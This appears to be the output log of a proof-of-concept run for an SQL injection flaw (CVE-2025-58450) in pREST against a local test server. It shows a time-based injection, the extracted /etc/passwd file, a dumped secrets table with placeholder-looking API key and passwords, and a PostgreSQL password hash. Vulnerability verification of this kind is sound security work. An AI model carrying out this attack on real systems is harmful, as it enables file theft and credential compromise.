============================================================
CVE-2025-58450 - pREST SQL Injection PoC
============================================================
[*] Target: http://localhost:3000

[*] Testing time-based SQL injection...
[+] Time-based SQLi successful! Response delayed by 3.01 seconds

[*] Attempting to read file: /etc/passwd
[+] File content extracted:
--------------------------------------------------
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh

--------------------------------------------------

[*] Attempting to read secrets table via direct access...
[+] Secrets table content:
--------------------------------------------------
  API_KEY: sk-super-secret-api-key-12345
  DB_PASSWORD: admin_password_secret
  JWT_SECRET: jwt-signing-secret-key
--------------------------------------------------

[*] Attempting to read PostgreSQL password hashes...
[+] PostgreSQL password hashes:
--------------------------------------------------
  SCRAM-SHA-256$4096:KlwFAOAJADjLAgt9QJ/Ffw==$vF53gQ+R1l1CJW+KkUmIiiMJoe4vN5iVKFqo37dGhBY=:EKM5qGua4ePlnBbANoK3PzJ8RlSC/AyeGvfKUmwBJms=
--------------------------------------------------

============================================================
Summary:
============================================================
  time_based_sqli: SUCCESS
  file_read: SUCCESS
  secrets_access: SUCCESS
  pg_shadow_access: SUCCESS

[+] All SQL injection tests passed - vulnerability confirmed!
